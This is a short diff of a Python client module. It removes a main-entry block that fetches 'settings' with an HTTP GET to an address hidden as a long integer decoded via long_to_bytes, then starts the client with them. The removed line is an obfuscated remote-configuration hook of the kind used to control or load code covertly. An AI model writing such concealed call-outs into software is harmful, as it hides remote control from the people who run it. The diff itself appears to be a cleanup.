@@ -1041,9 +1041,5 @@ class Client(object):
 def main(*args, **kwargs):
     client = Client(**kwargs)
     return client.start()
-
-
-if __name__ == '__main__':
-    main(**request('GET', long_to_bytes(5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950)).json()['settings'])
-    
+   
 
